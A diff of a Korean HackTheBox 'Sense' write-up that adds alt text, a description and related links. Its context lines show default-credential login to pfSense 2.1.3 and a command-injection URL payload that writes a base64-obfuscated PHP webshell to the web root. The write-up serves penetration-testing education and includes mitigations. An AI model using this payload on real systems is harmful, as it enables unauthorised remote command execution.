@@ -5,6 +5,7 @@ draft = false
 
 categories = ["HTB", "pentesting"]
 tags = ["HTB", "write-up", "pfSense", "Command Injection", "CVE", "OpenBSD", "gobuster"]
+description = "HackTheBox Sense 풀이 — gobuster 확장자 enum으로 노출된 system-users.txt에서 자격증명을 찾고, pfSense 2.1.3의 status_rrd_graph_img.php Command Injection 취약점으로 별도 권한 상승 없이 root 쉘을 획득하는 과정을 분석한다."
 +++
 
 # HTB - Sense (Retired Machine)
@@ -42,7 +43,7 @@ GET /status_rrd_graph_img.php?database=queues
 
 취약한 코드는 아래와 같다.
 
-![](./images/command_injection_vuln_code.png)
+![status_rrd_graph_img.php의 입력 미검증 취약 코드](./images/command_injection_vuln_code.png)
 
 ```php
 $curdatabase = $_GET['database'];
@@ -129,7 +130,7 @@ gobuster dir -u https://10.129.33.251 \
 
 `/system-users.txt`가 노출되어 있다. 내용을 확인한다.
 
-![](./images/default_credential.png)
+![system-users.txt에 노출된 사용자명과 패스워드 힌트](./images/default_credential.png)
 
 유저명 `Rohit`과 패스워드 힌트 "company defaults"가 담겨 있다. pfSense의 기본 패스워드는 `pfsense`인데, "company defaults"가 이를 가리키는 것으로 보인다.
 
@@ -148,7 +149,7 @@ password: pfsense
 
 로그인 후 대시보드에서 pfSense 버전 정보를 확인할 수 있다.
 
-![](./images/dashboard.png)
+![pfSense 대시보드에서 확인한 버전 2.1.3 정보](./images/dashboard.png)
 
 버전: **2.1.3**
 
@@ -169,9 +170,9 @@ searchsploit pfsense 2.1
 
 `/status_rrd_graph_img.php?database=queues`에 GET 요청을 보내면 PNG 이미지로 그래프 데이터를 반환한다.
 
-![](./images/vuln_graph_image.png)
+![status_rrd_graph_img.php가 반환하는 시스템 자원 그래프 PNG](./images/vuln_graph_image.png)
 
-![](./images/vuln_url.png)
+![database 파라미터에 대한 정상 요청과 응답](./images/vuln_url.png)
 
 `database` 파라미터에 세미콜론으로 명령을 이어 붙이면 Command Injection이 가능하다.
 
@@ -179,7 +180,7 @@ searchsploit pfsense 2.1
 
 PHP 웹쉘을 웹 루트에 쓰는 payload를 만든다. pfSense 웹 루트는 `/usr/local/www/`다.
 
-![](./images/payload.png)
+![database 파라미터에 Command Injection 페이로드를 적용한 웹쉘 업로드 요청](./images/payload.png)
 
 ```
 /status_rrd_graph_img.php?database=queues;cd+..;cd+..;cd+..;cd+usr;cd+local;cd+www;echo+"<?php+eval(base64_decode('ZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsg'));?>">shell.php
@@ -280,3 +281,11 @@ cat /root/root.txt
 | Command Injection (입력 미검증) | 외부 입력의 쉘 메타문자 필터링, `escapeshellarg()` 적용 |
 | rrdtool root 권한 실행 | 최소 권한 원칙으로 프로세스 권한 분리 |
 | 버전 정보 대시보드 노출 | 인증 전 버전 노출 최소화, 관리 인터페이스 IP 제한 |
+
+---
+
+## 관련 글
+
+- [HTB - Sau](/posts/sau/) — 버전 식별 후 공개 CVE로 Command Injection을 트리거하는 동일 패턴. SSRF로 내부 서비스에 접근하는 단계가 추가된다.
+- [HTB - Oopsie](/posts/oopsie/) — SUID 바이너리의 Command Injection으로 권한을 상승시키는 사례.
+- [HTB - Vaccine](/posts/vaccine/) — 노출된 버전 정보를 단서로 공개 익스플로잇을 연결하는 흐름.
